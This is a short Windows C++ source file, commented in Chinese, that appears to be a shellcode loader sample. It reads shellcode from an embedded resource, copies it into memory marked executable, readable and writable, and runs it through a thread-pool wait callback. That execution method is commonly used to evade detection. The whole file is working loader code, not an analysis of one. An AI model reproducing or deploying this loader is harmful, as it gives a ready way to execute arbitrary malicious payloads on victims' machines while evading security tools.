#include"..\public.hpp"

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{
	//1.获取shellcode
	UINT shellcodeSize = 0;
	unsigned char *shellcode = GetShellcodeFromRes(100, shellcodeSize);
	if (shellcode==nullptr)
	{
		return 0;
	}
	//2.分配shellcode空间
	LPVOID Memory = VirtualAlloc(NULL,shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode,shellcodeSize);
	//4.执行shellcode
	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)Memory, NULL, NULL);
	SetThreadpoolWait(threadPoolWait, event, NULL);
	WaitForSingleObject(event, INFINITE);
	return 0;
}